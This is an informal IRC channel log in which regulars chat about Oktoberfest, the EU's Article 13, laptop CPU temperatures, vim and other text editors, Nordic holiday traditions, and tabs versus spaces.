Jun 20 11:52:51 <vehk>	Oktoberfest is a bad combination.
Jun 20 11:53:03 <john_cephalopoda>	Yesterday evening I refused a beer and drank water instead, also left the party early.
Jun 20 11:53:07 <shikhin>	(I think we ought to do something about your quote of john_cephalopoda being an alien trying to trick us into thinking its a markov chain bot not being in either the lawlogs or the quotedb.)
Jun 20 11:53:19 <vehk>	mhmh
Jun 20 11:53:43 <s_gautam>	oh huh, is it not a nationwide thing?
Jun 20 11:53:47 <vehk>	Mh, I thought that got addquoted, though, but unsure now
Jun 20 11:54:01 <vehk>	s_gautam: What do you mean?
Jun 20 11:54:01 <shikhin>	Right, me too, but can't find it so now I'm looking at old pecan quotes in the quotedb.
Jun 20 11:54:09 <john_cephalopoda>	s_gautam: Stuff like that is only celebrated in the most backward regions of Germany. 
Jun 20 11:54:20 <vehk>	You mean most backward region. Like, singular.
Jun 20 11:54:24 <vehk>	Fucking Bavaria.
Jun 20 11:54:24 <s_gautam>	vehk: the wiki page says it's only observed by Munich
Jun 20 11:54:47 <john_cephalopoda>	vehk: The north of Bavaria is Franken though.
Jun 20 11:54:50 <shikhin>	vehk: I don't know much about Germany, why the Bavaria hatred?

Jun 20 11:59:27 <john_cephalopoda>	vehk: If I was a politician I'd go to the Bundestag every day and protest when there are too little people there.

Jun 20 12:01:01 <s_gautam>	oh
Jun 20 12:01:01 <shikhin>	vehk: At the nearest bakery. (Yeah, that was my backup vacation plan, cutting short the Switzerland thing and staying in a resort there.)
Jun 20 12:01:10 <vehk>	ah
Jun 20 12:01:30 <shikhin>	Equidistant from Frankfurt and Munich?
Jun 20 12:01:34 <shikhin>	Hmm.
Jun 20 12:01:51 <vehk>	Hm, seems to me Frankfurt is closer, but unsure
Jun 20 12:01:53 <shikhin>	vehk: Ah, right, the resort was in Freiburg.
Jun 20 12:02:09 <vehk>	Ah, yeah
Jun 20 12:02:11 <john_cephalopoda>	Freiburg is a pretty city.
Jun 20 12:02:13 <vehk>	That's good enough really
Jun 20 12:02:16 <john_cephalopoda>	Right in the Black Forest.
Jun 20 12:02:23 <shikhin>	vehk: Oh, good––a friend of mine is going to Bonn so now added incentive to visit Germany (Frankfurt, more specifically).
Jun 20 12:02:53 <john_cephalopoda>	shikhin: A recommendation for Bonn: Visit the Haribo factory sale. 
Jun 20 12:03:13 <CompanionCube>	'Though the new rules have been approved by the EU's JURI commission, they will not go into effect until they are passed by the European Parliament.' maybe they won't still be chucklefucks?

Jun 20 12:05:46 <bslsk05>	​twitter: <PeterSweden7> The fact that the EU now has voted yes to Article 13 which would destroy the internet as we know it and BAN MEMES, shows that the elite are completely out of touch. ␤  ␤ It's time for them to go. #Article13
Jun 20 12:06:10 <s_gautam>	shikhin: that's the article that prevents the state from legislating a law that abridges on the fundamental rights of the citizenry

Jun 20 12:06:15 <s_gautam>	right
Jun 20 12:06:16 <vehk>	First of all, I don't like article 13.

Jun 20 12:06:26 <s_gautam>	why
Jun 20 12:07:00 <s_gautam>	I mean, i get it, right wing memes are literally memeing people into positions of president and prime ministers
Jun 20 12:07:09 <vehk>	There's exceptions of course, but the vast number of memes are just trash

Jun 20 12:07:55 <shikhin>	Better yet, follow nortti on twitter and let twitter show you their likes for good memes.
Jun 20 12:07:56 <CompanionCube>	anyone up for xonotic?

Jun 20 12:08:15 <shikhin>	Haha.
Jun 20 12:08:30 <shikhin>	I'm kind of annoyed by the general usage of the word "meme", but that's probably just me and nothing to do with memes themselves.
Jun 20 12:08:50 <s_gautam>	maymay is more sophisticated
Jun 20 12:08:50 <vehk>	I'd be with you trying to find another word, but that's so pointless

Jun 20 14:52:59 *	FireFly starts 4× yes >/dev/null
Jun 20 14:53:15 <FireFly>	(of course, this lappy is still new, well, like half a year old)
Jun 20 14:53:57 <FireFly>	doesn't seem to go above 45°C today at least
Jun 20 14:53:57 <nanovad>	I appear to be idling at 42°C with the door open at an ambient temp of 25°C or so
Jun 20 14:53:58 <FireFly>	hm
Jun 20 14:54:29 <olsner>	maybe 'yes' isn't quite using all CPU features
Jun 20 14:54:37 <nanovad>	mmph, I can't wait until I can get a second stick of RAM on the cheap
Jun 20 14:54:43 <FireFly>	vehk: ah, hm, 30-40 -> 80 is quite the range
Jun 20 14:54:47 <vehk>	*shrug* my old GTX8800 went up to 80degC as well, though
Jun 20 14:54:51 <vehk>	Ah, yes, it is
Jun 20 14:54:58 <vehk>	(was a general shrug, bad timing)
Jun 20 14:55:03 <FireFly>	Sure
Jun 20 14:55:47 <FireFly>	My old lappy went up to 89°C consistently when all cores were capped
Jun 20 14:56:01 <FireFly>	olsner: I haven't seen it above 50 when running games either I think
Jun 20 14:56:18 <FireFly>	although admittedly I tend not to do a lot of resource-intensive stuff
Jun 20 14:56:59 <olsner>	I'm guessing desktops are more usually thermally limited, while a laptop cpu might just not have enough power to get hotter?
Jun 20 14:58:25 <olsner>	or not exactly thermal limit, since 80C is iirc still below where it actually throttles
Jun 20 14:58:35 <vehk>	At least for me, yeah
Jun 20 14:58:42 <vehk>	Well below that even
Jun 20 14:59:34 <vehk>	Was just reminded of this, since I've never monitored temperature
Jun 20 14:59:41 <vehk>	Usually if it goes bad I'll notice :D:
Jun 20 15:00:02 <olsner>	oh, it's late now... niht
Jun 20 15:00:08 <vehk>	olsniht
Jun 20 15:00:13 <nanovad>	olsner: niht
Jun 20 15:01:49 <vehk>	But of course you can actually reasonably get away with passively-cooled desktop systems
Jun 20 15:02:01 <FireFly>	olsner: true
Jun 20 15:02:12 <vehk>	The one I have is (still, it's pretty old now) just really a beast
Jun 20 15:02:42 <FireFly>	it's just that my experience from, er, circa 2010-2011, is that my desktop was typically at like 60-65ish tops, but lappy went up to 80-90ish
Jun 20 15:02:47 <FireFly>	which is why I was surprised
Jun 20 15:02:53 <vehk>	mh, right
Jun 20 15:03:19 *	CompanionCube compresses very many of the things with LZ4
Jun 20 15:03:20 <FireFly>	but yeah, this lappy does only have an i3
Jun 20 15:03:21 <FireFly>	err i5*
Jun 20 15:03:37 <vehk>	I really want to try out the new Ryzens
Jun 20 15:03:39 <vehk>	But moneys
Jun 20 15:03:43 <CompanionCube>	if i wanted to lower my I/O speed I could go for gzip but screw that
Jun 20 15:04:47 <nanovad>	CompanionCube: whatcha compressing?
Jun 20 15:05:05 <vehk>	FireFly: Should actually see how hot my Surface gets, but don't really want to damage the battery
Jun 20 15:05:06 <vehk>	So better not
Jun 20 15:05:34 <FireFly>	haha
Jun 20 15:05:38 <FireFly>	nod
Jun 20 15:05:44 <CompanionCube>	nanovad: everything
Jun 20 15:06:09 <CompanionCube>	(technically stuff that isn't seen as compressible isn't compressed)
Jun 20 15:06:19 <vehk>	Heuristic?
Jun 20 15:06:26 <CompanionCube>	yep
Jun 20 15:06:31 <vehk>	mmh
Jun 20 15:06:48 <CompanionCube>	no point wasting CPU in the i/o path for incompressible data
Jun 20 15:07:50 <CompanionCube>	(the gzip option does not have this heuristic. it will happily spend CPU trying to further compress your gigabytes of compressed video)
Jun 20 15:08:10 <CompanionCube>	zstd when
Jun 20 15:08:59 <nanovad>	odd, flash drive isn't showing up in lsblk
Jun 20 15:09:04 <nanovad>	:thinking:
Jun 20 15:09:43 <nanovad>	ah, probably kernel updates
Jun 20 15:11:35 <vehk>	When in doubt, always check dmesg
Jun 20 15:13:30 <nanovad>	It was showing up in there
Jun 20 15:13:47 <nanovad>	Rebooted and now it's showing as a block device
Jun 20 15:13:49 <nanovad>	woo
Jun 20 15:15:53 <nanovad>	vehk: "New Ryzens" as in the 2nd gen?
Jun 20 15:19:53 <vehk>	Yep
Jun 20 15:19:56 <zgrep>	vehk: Do the stealies and get the Ryzens.
Jun 20 15:19:59 <nanovad>	Yeah, they look pretty nifty
Jun 20 15:20:25 <nanovad>	I'll probably end up with a 2700 series as the CPU upgrade for this box before I retire it, but that's still a few years out at least
Jun 20 15:22:11 <vehk>	I was looking at Threadripper around the time they announced the new ones
Jun 20 15:22:16 <vehk>	But I was going to wait anyway
Jun 20 15:22:52 <vehk>	And tbh, I don't actually need a new CPU
Jun 20 15:23:45 *	nanovad nods
Jun 20 15:23:50 <nanovad>	This CPU suits me pretty well too
Jun 20 15:24:04 <nanovad>	I should probably get more RAM and a better GPU before CPU tbh
Jun 20 15:24:24 <vehk>	It's just hard to ignore "mmh, 16 cores"
Jun 20 15:24:44 *	nanovad nods
Jun 20 15:24:46 <vehk>	It's a total waste if you're playing games, really
Jun 20 15:24:58 <vehk>	And I wouldn't buy a CPU like that if I was only playing games
Jun 20 15:25:25 <nanovad>	My dad says that my computer is "way overkill" for what I do (mostly coding and some games), tells me it's basically a "glorified word processor"
Jun 20 15:25:29 <nanovad>	But I do some renders and stuff too

Jun 20 16:19:45 <FireFly>	It works great! until I unfocus the window, after which it seemingly pauses/doesn't repaint the window anymore, nor does it start again when I refocus the game
Jun 20 16:19:57 <vehk>	D:
Jun 20 16:20:01 <FireFly>	so I *could* play it, if I'm disciplined enough to not do anything else whilst playing :D

Jun 21 08:42:58 <shikhin>	=ud fashy
Jun 21 08:42:59 <Eldis4>	​shikhin: Fashy: Fashy means Fascism-like, or to be full of fascism. Similiar to other slang terms like "jazzy" and "flashy." The term originated in the mid 2010's on various social media sites, specifically used by the individuals involved with the "Alternative Right" or […]

Jun 21 08:44:58 <S_Gautam>	shikhin: Well, apparently Prayag is the default name, I just asked my grandmother
Jun 21 08:45:55 <shikhin>	zgrep: Good.

Jun 21 08:53:09 <S_Gautam>	any one of you use Eclipse for C/C++?
Jun 21 08:53:23 <vehk>	I have used Eclipse before, but a long time ago and for Java
Jun 21 08:53:37 <shikhin>	I have used it for C a long time ago as well.
Jun 21 08:53:40 <S_Gautam>	vehk: now they have an installer like Visual Studio
Jun 21 08:53:50 <S_Gautam>	shikhin: I used turbo c++ during the high school CS practical
Jun 21 08:54:12 <asecretcat-web>	whenever i get back to C(++) i've been thinking of using VSCode
Jun 21 08:54:15 <shikhin>	Hehe, so did most of the rest of the country.
Jun 21 08:54:32 <vehk>	Don't really use IDEs nowadays - except IntelliJ for Java, because Java is a bit of a mess to do manually
Jun 21 08:54:34 <S_Gautam>	i think kids these days have moved onto code::blocks
Jun 21 08:55:31 <vehk>	I should really finally try to fully get into vis, but time

Jun 21 08:56:18 <shikhin>	Ah.
Jun 21 08:57:07 <shikhin>	vehk: That looks kinda neat.
Jun 21 08:57:31 <shikhin>	(otoh, I like sublime text and it explicitly states it won't implement some of the things I'm used to)
Jun 21 08:57:40 <vehk>	Oh, what would that be?
Jun 21 08:57:51 <shikhin>	"tabs / multiple workspaces / advanced window management

Jun 21 08:57:53 <shikhin>	:P
Jun 21 08:57:55 <vehk>	Ah
Jun 21 08:58:19 <zgrep>	* <shikhin> raises his eyebrow at zgrep. <-- I let other people voice/devoice me, and usually don't notice when they do/don't.
Jun 21 08:58:29 <S_Gautam>	sublime text is beautiful
Jun 21 08:58:39 <vehk>	shikhin: I do that with tmux these days, rarely with vim
Jun 21 08:58:53 <vehk>	ybden's using kakoune lots these days, that one also looks really neat
Jun 21 08:59:26 <vehk>	Then again, would also be nice to get away from the mess that is terminals
Jun 21 08:59:33 <shikhin>	Indeed, 'tis.
Jun 21 09:00:23 <S_Gautam>	i find terminal based editors highly inefficient tbh
Jun 21 09:00:28 <vehk>	How so?
Jun 21 09:00:44 <S_Gautam>	I don't know, I'm just used to a graphical interface, click and pointy
Jun 21 09:00:59 <shikhin>	What do you mean by "highly inefficient"?
Jun 21 09:01:28 <S_Gautam>	shikhin: difficult to work with, learning curve
Jun 21 09:01:57 <S_Gautam>	i only use vim or nano when i don't have a graphical environment
Jun 21 09:02:15 <asecretcat-web>	i like vim but i tried doing copypaste on it...turns out you need to enable it on compilation if you want it to interact with the system clipboard
Jun 21 09:02:31 <vehk>	Yeah, that's a bit of a shitshow, although not really vim's fault, more X's
Jun 21 09:02:32 <asecretcat-web>	otherwise it always just uses its internal clipboard no matter what
Jun 21 09:02:36 <asecretcat-web>	true
Jun 21 09:02:43 <zgrep>	Most terminal editors I know of can do the mouse thing, and the scrolling thing...
Jun 21 09:03:03 <asecretcat-web>	actually in this case it's macOS
Jun 21 09:03:29 <zgrep>	neovim "just worked" for me when I told it to use the system clipboard...
Jun 21 09:03:32 <vehk>	Even when you have X's clipboards, they're just a pain to work with
Jun 21 09:03:44 <zgrep>	For when I had macOS.
Jun 21 09:03:59 <vehk>	And gtk3 doesn't even support Shift-Insert anymore for apps built against it
Jun 21 09:04:15 <vehk>	So I have to resort to mouse middle-click again ;_;
Jun 21 09:04:36 <shikhin>	I also honestly don't think it's the editor that's stopping me from being more productive, so I also don't think much about different editors.
Jun 21 09:05:14 <vehk>	zgrep: Well, sure, neovim and vim can do this, but you have to compile it in
Jun 21 09:05:25 <vehk>	It's probably autodetect in .configure (at least for vim)
Jun 21 09:05:34 <vehk>	But when you have a binary distro, the main vim package might not come with X
Jun 21 09:05:40 <vehk>	But rather it has a gvim one you need to install
Jun 21 09:06:34 <S_Gautam>	shikhin: if it takes more than 5 minutes of random keypressing to get the editor into "insert" mode and another 3-4 google searches on how to save and quit, then i would consider the editor to be a hindrance
Jun 21 09:06:52 <vehk>	Then clearly you cannot or are not ready to learn.
Jun 21 09:06:57 <shikhin>	Eh, takes some while to get good at exploiting any good editor.
Jun 21 09:07:38 <asecretcat-web>	does emacs have separate editing modes like vim does?
Jun 21 09:07:57 <asecretcat-web>	iirc only vim has that weird way of controlling it, and i guess that's mostly from following a long legacy.
Jun 21 09:08:14 <vehk>	emacs is not a modal editor, no
Jun 21 09:08:42 <vehk>	And, well, there's ed of course that has modal editing, and then yeah, you get the long legacy
Jun 21 09:08:42 <S_Gautam>	vehk: imo energy should be spent on actual programming rather than some obscure editor
Jun 21 09:09:33 <vehk>	An editor is a tool you have to learn. The fact that you learnt about the basics of GUI-oriented editing somewhere else doesn't mean that this way of doing it is inherently better
Jun 21 09:09:49 <zgrep>	vehk: I'm saying that it was already compiled in for wherever I got it from, and I wouldn't be surprised if it's compiled in in other places too.
Jun 21 09:09:55 <vehk>	Ah, right
Jun 21 09:10:00 <shikhin>	Sure, although isn't a lot of vim / emacs stuff based on legacy constraints?
Jun 21 09:10:01 <vehk>	Oh, of course, just not usually in the "vim" package
Jun 21 09:10:19 <vehk>	shikhin: I wouldn't say modal editing is a legacy constraint at all, no
Jun 21 09:10:25 <vehk>	Some of the things, yes, like being bound to terminals
Jun 21 09:10:28 <shikhin>	Why is it a good idea?
Jun 21 09:10:29 <vehk>	(which emacs is not)
Jun 21 09:10:30 <asecretcat-web>	hot take: bring back edit.com
Jun 21 09:10:36 <zgrep>	Ah. But this is macOS, and it was neovim. Probably using Homebrew. I added a magic line to my nvimrc, and it Just Worked™.
Jun 21 09:11:24 <vehk>	shikhin: Compare how vim and emacs solve things, modal editing makes it easier to have a simple setup of key bindings. Instead of emac's modifier keys
Jun 21 09:11:42 <asecretcat-web>	can nano do syntax highlighting?
Jun 21 09:11:50 <asecretcat-web>	i haven't used nano in a long time
Jun 21 09:12:00 <zgrep>	vehk: Err, I'm saying it was autocompiled in from wherever I took it from, then. Which was probably homewbrew, because macOS.
Jun 21 09:12:00 <zgrep>	Gaah. The internet on this plane is unbearably slow... and for some reason I can't see my own messages echoed back to me from quassel. :(
Jun 21 09:12:16 <vehk>	shikhin: Not saying modifier keys are a bad idea, mind you
Jun 21 09:12:20 <shikhin>	Mmm.
Jun 21 09:12:22 <asecretcat-web>	it seemed like the closest one could get to a traditional GUI editor in terminals
Jun 21 09:12:26 <zgrep>	vehk: Nah, you're just using the wrong keyboard, that's all.
Jun 21 09:12:35 <vehk>	haha
Jun 21 09:12:50 <vehk>	shikhin: You can definitely argue that ed, for example, is based on legacy constraints
Jun 21 09:12:59 <vehk>	But if you get used to it, it's actually really quite powerful still
Jun 21 09:13:12 <shikhin>	Mmm.
Jun 21 09:13:21 <vehk>	(I mean, ed doesn't even show you the file by default, because that would have wasted resources back then)
Jun 21 09:13:25 <zgrep>	vehk: Both editors were designed when thinking about certain keyboards. You'll notice that on whatever keyboard it is I'm thinking of, all the modifier keys are big, easy to use, and next to each other.
Jun 21 09:13:55 <zgrep>	Alas, it's hard to look things up using inflight wifi.
Jun 21 09:13:56 <vehk>	Mh, yes, that is true - but modal editing compared to other ways has become more of its own thing now
Jun 21 09:14:13 <zgrep>	Well, they're all their own thing, no?
Jun 21 09:14:15 <vehk>	And even for emacs you're not using the "correct" keyboard nowadays either, usually
Jun 21 09:14:17 <vehk>	Oh, sure, yes
Jun 21 09:14:58 <zgrep>	Technically, you can also say that modifier keys *are* modal editing... with a button you hold down to stay in that mode. :P
Jun 21 09:15:02 <vehk>	Like I said, the only legacy constraint in my opinion that is really a hinderance nowadays is the damn terminal
Jun 21 09:15:12 <vehk>	zgrep: I guess, yes
Jun 21 09:15:19 <zgrep>	What would you do instead of a terminal?
Jun 21 09:15:27 <shikhin>	Not-a-terminal.
Jun 21 09:15:49 <vehk>	zgrep: Well, you could do something like acme, for example
Jun 21 09:16:06 <zgrep>	That's still in a terminal, more or less, no?
Jun 21 09:16:15 <vehk>	What do you define as a terminal?
Jun 21 09:16:49 <vehk>	It's very definitely not a terminal in the way that it emulates actual terminals
Jun 21 09:16:53 <vehk>	It's a graphical shell
Jun 21 09:17:27 <shikhin>	< vehk> (I mean, ed doesn't even show you the file by default, because that would have wasted resources back then) <- Right, just feels weird to learn using something that's primarily based on the constraints of another era.
Jun 21 09:17:38 <vehk>	Like, say, cell-based design is also a terminal kludge
Jun 21 09:17:40 <shikhin>	That doesn't mean it won't have any good ideas, though.
Jun 21 09:18:58 <vehk>	Mh, I'd argue that the knowledge obtained designing something around certain constraints isn't worthless if the constraint suddenly vanishes
Jun 21 09:19:05 <vehk>	And like you say, the design is still good
Jun 21 09:19:24 <shikhin>	vehk: Sure, so it'd be a good idea to study those if you're interested in designing editors right now.
Jun 21 09:19:29 <vehk>	Myself, I'm just interesting in good design
Jun 21 09:19:31 <shikhin>	Which I have faith that the sublime text folks looked into. :P
Jun 21 09:19:35 <vehk>	Mh
Jun 21 09:19:37 <vehk>	Sure
Jun 21 09:20:12 <vehk>	Haven't used sublime myself, for example
Jun 21 09:20:16 <zgrep>	Hm. Okay, sure... I guess acme uses the plan9 stuff to display things.
Jun 21 09:20:25 <vehk>	Well, yes, it's very deeply integrated
Jun 21 09:20:32 <vehk>	Well, deep in a good-design-way
Jun 21 09:20:35 <vehk>	With plumber and all
Jun 21 09:20:41 <zgrep>	Mmh.
Jun 21 09:21:01 <vehk>	One thing that is really broken in terminals today is fonts/non-western languages
Jun 21 09:21:04 <vehk>	Because it's all cell-based
Jun 21 09:21:17 <olsner>	hm, just found The Lobster on netflix, wonderfully weird and dark comedy
Jun 21 09:21:40 *	zgrep is sort-of sad that something like plan9 hasn't taken off as anything other than a compilation target for Go. I'm also not willing to put effort into this to change the situation, because... I'm not interested in it enough.
Jun 21 09:22:03 <nortti>	<+zgrep> Hm. Okay, sure... I guess acme uses the plan9 stuff to display things. ← iirc, the text box thing is actually copied a couple times in the plan9 codebase
Jun 21 09:22:06 <zgrep>	olsner: Vague, non-givinig-anything-away description, pls?
Jun 21 09:22:20 <zgrep>	nortti: Hm?

Jun 21 09:22:29 <shikhin>	Or otherwise I would've chided zgrep for their latest /me message.

Jun 21 09:23:59 <nanovad>	Side note, anybody know of a faster way to get around in vim other than keyrepeat or moving by line, then e/b ?
Jun 21 09:24:05 <vehk>	Search

Jun 21 09:24:31 <zgrep>	nanovad: {}
Jun 21 09:24:31 <nanovad>	vehk: I recently learned about f/F but I haven't worked that into my workflow yet
Jun 21 09:24:35 <vehk>	/
Jun 21 09:24:38 <nanovad>	zgrep: Only works for blocks of text, no?
Jun 21 09:24:42 <nanovad>	vehk: ah, that seems sorta like overkill
Jun 21 09:24:54 <zgrep>	nanovad: Well, that's what it does, yes. Goes to the next blank line,
Jun 21 09:24:55 <zgrep>	.
Jun 21 09:25:06 <zgrep>	There's gg and G, of course.
Jun 21 09:25:12 <vehk>	There's a decent plugin that makes f/F work beyond one line, might want to look into that when you're used to it
Jun 21 09:25:15 <nanovad>	especially since it's going to stay highlighted until I set noh
Jun 21 09:25:22 <nortti>	 <+zgrep> nortti: Hm? ← I might be talking 100% out of my ass, but this is my understanding: there is no single "terminal" component in plan9. instead, every app that displays texts in an editable way kinda implements that itself. due to that, say, rio and acme use slightly different pieces of code for displaying the text
Jun 21 09:25:26 <zgrep>	In fact, probably g does a bunch more, but I've only learned about gg.
Jun 21 09:25:26 <nanovad>	(which I have mapped to a leader key anyway)
Jun 21 09:25:40 <olsner>	zgrep: ggg?G
Jun 21 09:25:52 <zgrep>	I... What does that do?

Jun 21 09:26:27 <vehk>	nanovad: Is this jumping to a specific point, or just scrolling around the file, or...?
Jun 21 09:26:48 <S_Gautam>	to install Unreal Engine i have to install Epic's adware now
Jun 21 09:26:54 <zgrep>	nanovad: :D:
Jun 21 09:27:16 <nanovad>	vehk: Eh, one situation I find in particular is "I see a line of code that I want to modify a few lines up from where I am at, but I want to edit the middle of the line", so I press j/k until I'm on that line, then e until I get roughly where I want to go, then h/l
Jun 21 09:27:41 <vehk>	Yeah, I'd just use / for that
Jun 21 09:27:47 <nanovad>	Obviously I could also use :<num> to move, or 8j or whatever
Jun 21 09:27:50 <nanovad>	gotcha
Jun 21 09:27:58 <vehk>	(Or ?, for upwards, obviously)
Jun 21 09:28:03 <olsner>	gg and gq are probably the only g commands I really use
Jun 21 09:28:14 <asecretcat-web>	S_Gautam: huh?
Jun 21 09:28:14 <vehk>	gj if you have a line that wraps

Jun 21 09:29:12 <asecretcat-web>	i'm not sure that is actually normal, i've never heard that before
Jun 21 09:29:20 <zgrep>	Yeah. I have both relative line numbers, and normal line numbers set. So it shows the line number for this line, and relative for the rest.
Jun 21 09:29:38 <nanovad>	ooh TIL about gj/k
Jun 21 09:29:41 <nortti>	zgrep: ooh, how do you do that? just set both?
Jun 21 09:29:42 <zgrep>	Not that I really use either... ._.
Jun 21 09:29:42 <asecretcat-web>	i'll...ask around though.  maybe this has happened to a friend.

Jun 21 09:30:21 <nanovad>	vehk: wonder how many of those work for neovim, but thanks
Jun 21 09:30:29 *	zgrep has a tendency to not install plugins for vim if zgrep can avoid them.
Jun 21 09:30:30 <vehk>	They should all work, I think

Jun 21 10:04:50 *	shikhin shakes fist.
Jun 21 10:04:51 <olsner>	nortti: *tomorrow
Jun 21 10:04:53 <FireFly>	Yeah, midsummer would really be the only one I think
Jun 21 10:04:55 <nortti>	(¹ this depends on the country)
Jun 21 10:05:04 <FireFly>	at least the only prominent one
Jun 21 10:05:06 *	john_cephalopoda (~john@unaffiliated/john-cephalopoda/x-6407167) has joined
Jun 21 10:05:10 <FireFly>	oh, well
Jun 21 10:05:12 <nortti>	olsner: tomorrow is the eve
Jun 21 10:05:21 <FireFly>	yeah, but it's the eve that matters
Jun 21 10:05:26 <nortti>	point
Jun 21 10:05:30 <FireFly>	:P
Jun 21 10:05:53 <nortti>	that's you get shitfaced on the weekend-eve
Jun 21 10:05:56 <nortti>	+why
Jun 21 10:06:09 <FireFly>	S_Gautam: during the christianisation of northern europe, plenty of the pagan traditions got merged/"rebranded" into christian ones, kinda, so e.g. we still use "jul" for christmas (cf. english yule/yuletide)
Jun 21 10:06:11 <john_cephalopoda>	I planned to translate the GDPR into English but didn't have the time yet. (cc nortti, shikhin)
Jun 21 10:06:15 <john_cephalopoda>	Also morwening.
Jun 21 10:06:19 <nortti>	hiya
Jun 21 10:06:21 <S_Gautam>	FireFly: oh i see
Jun 21 10:06:34 <FireFly>	and we also celebrate St. Lucy's day (december 13), which AFAIK stems from celebrating winter solstice originally
Jun 21 10:07:11 <FireFly>	There's also some easter things involving witches, which I think are somewhat pagan/pre-christian, but I think not specifically norse (I think it's a thing in other countries too)
Jun 21 10:07:29 <john_cephalopoda>	FireFly: Is St. Lucy's the one where people put candles on their heads?
Jun 21 10:08:34 <FireFly>	yes
Jun 21 10:08:37 <olsner>	both candles and cones go on heads for lucia, and saffron buns go inside heads
Jun 21 10:08:51 <S_Gautam>	._.
Jun 21 10:08:52 <FireFly>	true
Jun 21 10:09:01 <FireFly>	S_Gautam: what? :P
Jun 21 10:09:05 <S_Gautam>	"Saffron buns go inside heads"?

Jun 21 10:09:20 <olsner>	S_Gautam: you eat them :)
Jun 21 10:09:31 <FireFly>	S_Gautam: well yes, through the opening in the front of your mouth :P
Jun 21 10:09:34 <FireFly>	err heda
Jun 21 10:09:36 <S_Gautam>	oh
Jun 21 10:09:36 <FireFly>	head*
Jun 21 10:10:25 <nortti>	FireFly: the easter witch thing in finland is linked with the karelian (christian) tradition of blessing willow branches and giving each other blessing combined with the (christian) belief of evil walking the earth between crucifiction and revival of jesus
Jun 21 10:10:37 <nortti>	but might be different over there
Jun 21 10:11:30 <FireFly>	hmm oh yeah
Jun 21 10:11:36 <FireFly>	I guess it's a christian thing now that I think about it
Jun 21 10:12:22 <FireFly>	Hmm
Jun 21 10:13:02 <FireFly>	since you said norse/pagan /culture/, so not just religious aspects... well.. there's some games/summer activities that I'm pretty sure predate christianisation that are still pretty common today
Jun 21 10:13:10 <FireFly>	https://en.wikipedia.org/wiki/Kubb comes to mind
Jun 21 10:13:11 <bslsk05>	​en.wikipedia.org: Kubb - Wikipedia
Jun 21 10:13:33 <FireFly>	which comes from gotland
Jun 21 10:13:48 <shikhin>	"although there is no evidence of this"
Jun 21 10:13:52 <FireFly>	hm, or so I thought, but apparently the article claims this isn't true-- yeah
Jun 21 10:14:39 <nortti>	pre-christian style music and poetry is pretty dead too, post-reformation, at least here
Jun 21 10:14:48 <FireFly>	that's true
Jun 21 10:14:55 *	FireFly . o O ( viking metal )
Jun 21 10:14:59 <nortti>	:D:
Jun 21 10:15:08 <shikhin>	Are there still some people interested in it, or is it dead dead?

Jun 21 10:15:32 <nortti>	still some people, but it's definetly marked, in the linguistical sense of the word
Jun 21 10:15:34 <FireFly>	hmm
Jun 21 10:15:47 <john_cephalopoda>	Hmm, Walpurgis Night is also a thing here.
Jun 21 10:16:30 <FireFly>	sure, valborg. basically bonfires and getting drunk, over here

Jun 21 10:16:44 <shikhin>	"Barbarism is about throwing a large bar between 16 and 26 kg as far as possible." Nice name?
Jun 21 10:17:03 <shikhin>	"Spark asshole / Spark cleaner" Even better name?
Jun 21 10:17:08 <nortti>	shikhin: the traditional poetry-form is associated strongly with kalevala nowadays (except in ritvala, which has its own tradition). traditional music is, uh, honestly don't run into it well enough for there to be a stereotype, really
Jun 21 10:17:20 <shikhin>	Ah.
Jun 21 10:17:34 <nortti>	well, if you use kantele there's the kalevala connection, but with other instruments you're just weird
Jun 21 10:17:41 <shikhin>	Haha.

Jun 21 10:26:09 <nortti>	ah, here: http://moxperidot.tumblr.com/post/167707512870
Jun 21 10:26:10 <shikhin>	nortti: Hmm, right, maybe a lot of corporations mandate spaces for some reason.
Jun 21 10:26:28 <john_cephalopoda>	:D
Jun 21 10:26:37 <nortti>	shikhin: the data seemed to be split about half/half, tho
Jun 21 10:26:51 <shikhin>	Oh, did I miss that part?
Jun 21 10:26:51 <john_cephalopoda>	a corporation man date(1)
Jun 21 10:27:18 <nortti>	well, not half/half, but mostly equal "There were 28,657 survey respondents who provided an answer to tabs versus spaces and who considered themselves a professional developer (as opposed to a student or former programmer). Within this group, 40.7% use tabs and 41.8% use spaces (with 17.5% using both)."
Jun 21 10:27:39 <shikhin>	Ah, er, better paying corporations*
Jun 21 10:27:43 <nortti>	mh
Jun 21 10:28:10 *	shikhin . o O ( people who use tabs don't consider themselves professionals )
Jun 21 10:30:37 <S_Gautam>	who uses spaces honestly
Jun 21 10:30:44 *	shikhin raises hands.
Jun 21 10:30:45 <S_Gautam>	or tabs
Jun 21 10:30:57 <S_Gautam>	i thought indentation was the job of the IDE bro
Jun 21 10:30:59 <zgrep>	I use them dishonestly, for malicious purposes only.
Jun 21 10:31:00 <S_Gautam>	;)
Jun 21 10:33:35 <vehk>	< nortti> vehk: do you also do the thing where on the bus you glance in the direction of the stop button for similar effect <- mh, no, although I haven't been on the bus for over 8 years now
Jun 21 10:34:10 <nortti>	ah
Jun 21 10:34:31 <vehk>	I mean, I guess I've been on the bus last year in the UK, but it's a bit different there anyway
Jun 21 10:34:40 <vehk>	I mean people actually thank the driver when they're getting off
Jun 21 10:34:40 *	shikhin hasn't been on a bus ever, but he looks forward to trying that out some day.
Jun 21 10:34:42 <vehk>	I was amazed
Jun 21 10:35:05 <S_Gautam>	i once was on a bus ride that lasted for 20 hours
Jun 21 10:35:07 <S_Gautam>	cramped as fuck
Jun 21 10:35:22 <vehk>	< S_Gautam> who uses spaces honestly <- meeeeeeee
Jun 21 10:35:25 <S_Gautam>	wanted to take a shit but couldn't even get out of my seat
Jun 21 10:35:27 <shikhin>	(I of course mean "on a bus" in the "on top of it" sense.)
Jun 21 10:35:36 <vehk>	right, right
Jun 21 10:36:10 <vehk>	nortti: Although I hate how the bus doesn't stop by default, I don't like pressing buttons in order for it to stop
Jun 21 10:36:18 <S_Gautam>	then it stopped for sometime and people got out for food and shit, now I had two choices: hold on for more than 4 hours or go into the forest to take a shit
Jun 21 10:36:19 <vehk>	In the UK (or at least the line I took) they didn't even announce the stops
Jun 21 10:36:31 <vehk>	Like, you actually have to know beforehand
Jun 21 10:36:53 <shikhin>	Ooh, Switzerland had nice big displays, I was fairly impressed.
Jun 21 10:37:06 <S_Gautam>	movie screens?
Jun 21 10:37:10 <S_Gautam>	"displays"?
Jun 21 10:37:11 <vehk>	Although I'd recommend busses in the UK in general, definitely in more rural areas. No lights in the street, narrow roads, tree branches hitting the top of the bus, driver going way too fast
Jun 21 10:37:13 <vehk>	It's an adventure
Jun 21 10:37:13 <shikhin>	No, stop signs.
